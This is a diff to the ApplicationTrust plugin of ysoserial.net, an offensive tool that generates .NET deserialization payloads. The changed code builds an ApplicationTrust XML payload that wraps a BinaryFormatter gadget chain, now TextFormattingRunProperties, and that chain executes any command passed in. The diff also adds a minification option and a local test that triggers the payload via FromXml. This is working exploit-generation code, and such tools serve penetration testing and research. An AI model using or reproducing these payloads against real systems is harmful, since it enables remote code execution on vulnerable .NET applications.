@@ -2,6 +2,7 @@
 using NDesk.Options;
 using System;
 using ysoserial.Generators;
+using ysoserial.Helpers;
 
 /**
  * Author: Soroush Dalili (@irsdl)
@@ -19,14 +20,16 @@ namespace ysoserial.Plugins
     class ApplicationTrustPlugin : Plugin
     {
         static string command = "";
-        static Boolean test = false;
-        static Boolean minify = false;
+        static bool test = false;
+        static bool minify = false;
+        static bool useSimpleType = true;
 
         static OptionSet options = new OptionSet()
             {
                 {"c|command=", "the command to be executed", v => command = v },
                 {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
                 {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
+                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
             };
 
         public string Name()
@@ -85,22 +88,26 @@ namespace ysoserial.Plugins
                 System.Environment.Exit(-1);
             }
 
-            byte[] osf = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false, minify);
+            byte[] osf = (byte[])new TextFormattingRunPropertiesGenerator().Generate(command, "BinaryFormatter", false, minify, useSimpleType);
             payloadValue = BitConverter.ToString(osf).Replace("-", string.Empty);
             payload = String.Format(payload, payloadValue);
 
             if (minify)
             {
-                payload = Helpers.XMLMinifier.Minify(payload, null, null);
+                payload = XMLMinifier.Minify(payload, null, null);
             }
 
             if (test)
             {
                 // PoC on how it works in practice
-                System.Security.SecurityElement malPayload = System.Security.SecurityElement.FromString(payload);
-                System.Security.Policy.ApplicationTrust myApplicationTrust = new System.Security.Policy.ApplicationTrust();
-                myApplicationTrust.FromXml(malPayload);
-                Console.WriteLine(myApplicationTrust.ExtraInfo);
+                try
+                {
+                    System.Security.SecurityElement malPayload = System.Security.SecurityElement.FromString(payload);
+                    System.Security.Policy.ApplicationTrust myApplicationTrust = new System.Security.Policy.ApplicationTrust();
+                    myApplicationTrust.FromXml(malPayload);
+                    Console.WriteLine(myApplicationTrust.ExtraInfo);
+                }
+                catch { }
             }
 
             return payload;
